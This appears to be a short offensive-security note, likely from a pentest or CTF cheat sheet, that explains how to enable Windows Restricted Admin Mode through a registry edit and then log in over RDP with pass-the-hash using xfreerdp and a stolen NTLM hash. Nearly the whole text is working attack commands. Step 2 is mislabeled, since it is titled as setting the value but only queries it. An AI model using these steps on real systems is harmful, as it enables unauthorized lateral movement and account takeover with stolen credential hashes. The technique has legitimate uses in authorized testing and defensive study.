## `DisableRestrictedAdmin`

If the key **doesnâ€™t exist**, Windows behaves **as if Restricted Admin Mode is disabled**, which means **RDP Pass-the-Hash is not allowed**.

1. To enable it, you need to **create the key and set its value to 0**.

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

2. set the value 
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
```

3. Access it now
```bash
xfreerdp /v:<TARGET_IP> /u:Administrator /pth:<NTLM_HASH> /cert:ignore /workarea /smart-sizing
```
